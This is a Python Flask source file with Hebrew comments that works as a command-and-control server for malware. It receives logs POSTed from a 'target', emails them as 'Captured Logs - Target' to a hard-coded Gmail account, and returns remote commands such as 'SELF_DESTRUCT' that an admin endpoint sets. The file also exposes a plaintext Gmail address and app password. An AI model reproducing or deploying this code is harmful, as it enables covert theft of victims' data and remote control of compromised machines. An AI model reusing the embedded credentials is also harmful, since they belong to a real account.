import os
import smtplib
import sys
from flask import Flask, request
from email.message import EmailMessage

app = Flask(__name__)

# --- הגדרות ---
# וודא שהמייל והסיסמה (16 תווים בלי רווחים) נכונים
EMAIL_USER = "n77971507@gmail.com"
EMAIL_PASS = "kcfyrlwmuqqwvgil"

# משתנה פקודה (כאן נשמר הסטטוס למחיקה)
current_cmd = "OK"


def send_to_mail(subject, content, attachment_path=None):
    """שליחת מייל מיידית - מותאם ל-Render (Port 465)"""
    msg = EmailMessage()
    msg.set_content(content)
    msg['Subject'] = subject
    msg['From'] = EMAIL_USER
    msg['To'] = EMAIL_USER

    # טיפול בקובץ מצורף (לפקודת מחיקה/קבצים)
    if attachment_path and os.path.exists(attachment_path):
        try:
            with open(attachment_path, 'rb') as f:
                file_data = f.read()
                file_name = os.path.basename(attachment_path)
                msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
        except Exception as e:
            print(f"DEBUG: Attachment Error: {e}", file=sys.stderr)

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_USER, EMAIL_PASS)
            smtp.send_message(msg)
        print(f"DEBUG: [SUCCESS] Mail sent: {subject}", file=sys.stderr)
        return True
    except Exception as e:
        print(f"DEBUG: [ERROR] Mail failed: {e}", file=sys.stderr)
        return False


# --- נתיבי השרת ---

@app.route('/api/v2/client', methods=['POST'])
def client_entry():
    """נתיב קבלת מידע מהמטרה"""
    global current_cmd

    json_data = request.get_json(silent=True)
    if not json_data:
        return current_cmd, 200  # מחזיר את הפקודה הנוכחית גם אם אין דאטה

    log_content = json_data.get("data", "")

    if log_content:
        # שליחה מיידית למייל ברגע שהמידע מגיע
        print(f"DEBUG: Data received, sending mail...", file=sys.stderr)
        send_to_mail("Captured Logs - Target", log_content)

    # מחזיר למטרה את הפקודה (למשל "OK" או "SELF_DESTRUCT")
    return current_cmd, 200


@app.route('/api/admin/set_command', methods=['POST'])
def set_command():
    """נתיב עבור ה-UI שלך - לשלוח פקודת מחיקה"""
    global current_cmd
    json_data = request.get_json(silent=True)

    if json_data and "command" in json_data:
        current_cmd = json_data.get("command")  # למשל: "SELF_DESTRUCT"
        print(f"DEBUG: Admin updated command to: {current_cmd}", file=sys.stderr)
        return f"Command updated to {current_cmd}", 200
    return "Invalid Data", 400


@app.route('/')
def health_check():
    return "Server is Live", 200


if __name__ == '__main__':
    # ב-Render חינמי הפורט הוא בדרך כלל 10000
    port = int(os.environ.get("PORT", 10000))

    # בדיקת חיבור מיידית בעלייה
    send_to_mail("Server Restarted", "V2 Server is now running on Render.")

    app.run(host='0.0.0.0', port=port)